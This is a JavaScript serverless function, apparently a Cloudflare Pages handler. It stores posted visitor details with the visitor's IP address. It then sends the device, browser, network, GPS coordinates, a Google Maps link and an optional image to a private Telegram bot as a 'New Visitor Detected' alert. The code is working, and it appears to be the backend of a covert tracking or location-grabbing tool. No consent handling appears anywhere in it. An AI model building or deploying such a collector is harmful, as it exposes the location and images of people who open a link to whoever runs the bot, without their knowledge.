export async function onRequestPost({ request, env }) {
  try {
    const body = await request.json();
    const id = body.session_id;

    const ip = request.headers.get("CF-Connecting-IP");

    let session = await env.VISITOR_KV.get(id);
    session = session ? JSON.parse(session) : {};

    Object.assign(session, body, {
      ip,
      updated: new Date().toISOString()
    });

    await env.VISITOR_KV.put(id, JSON.stringify(session));

    // ✅ send only on final event
    if (body.event === "final") {
      try {
        await sendTelegram(env, session);
      } catch (e) {
        console.log("Telegram error:", e);
      }
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { "Content-Type": "application/json" }
    });

  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500,
      headers: { "Content-Type": "application/json" }
    });
  }
}


async function sendTelegram(env, s) {
  const text = `
📍 <b>New Visitor Detected</b>

🕒 Time: ${s.updated}
🌐 IP: ${s.ip}
📱 Device: ${s.device || "-"}
💻 OS: ${s.os || "-"}
🌎 Browser: ${s.browser || "-"}

📡 Network: ${s.network || "-"}

📍 Location:
Lat: ${s.lat || "-"}
Lng: ${s.lng || "-"}

🔗 <a href="https://maps.google.com/?q=${s.lat},${s.lng}">Open Map</a>
`;

  // ✅ If image exists → send in SAME message
  if (s.image) {
    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: new URLSearchParams({
        chat_id: env.CHAT_ID,
        photo: s.image,
        caption: text,
        parse_mode: "HTML"
      })
    });
  } else {
    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      body: new URLSearchParams({
        chat_id: env.CHAT_ID,
        text: text,
        parse_mode: "HTML"
      })
    });
  }
}
